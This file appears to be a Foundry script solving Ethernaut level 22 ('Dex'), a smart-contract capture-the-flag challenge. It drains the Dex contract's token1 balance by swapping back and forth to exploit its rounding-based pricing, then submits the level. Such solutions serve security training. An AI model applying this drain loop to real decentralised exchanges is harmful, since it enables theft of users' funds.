// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Dex} from "../src/Level22.sol";

contract Level22 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Dex instance = Dex(vm.envAddress("LVL22_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address token1 = instance.token1();
        address token2 = instance.token2();

        instance.approve(address(instance), 1000000);
        while (instance.balanceOf(token1, address(instance)) != 0) {
            if (instance.balanceOf(token1, address(me)) < instance.balanceOf(token1, address(instance))) {
                instance.swap(token1, token2, instance.balanceOf(token1, address(me)));
            } else {
                instance.swap(token1, token2, instance.balanceOf(token1, address(instance)));
            }
            if (instance.balanceOf(token2, address(me)) < instance.balanceOf(token2, address(instance))) {
                instance.swap(token2, token1, instance.balanceOf(token2, address(me)));
            } else {
                instance.swap(token2, token1, instance.balanceOf(token2, address(instance)));
            }
        }
        ethernaut.submitLevelInstance(address(instance));

        vm.stopBroadcast();
    }
}
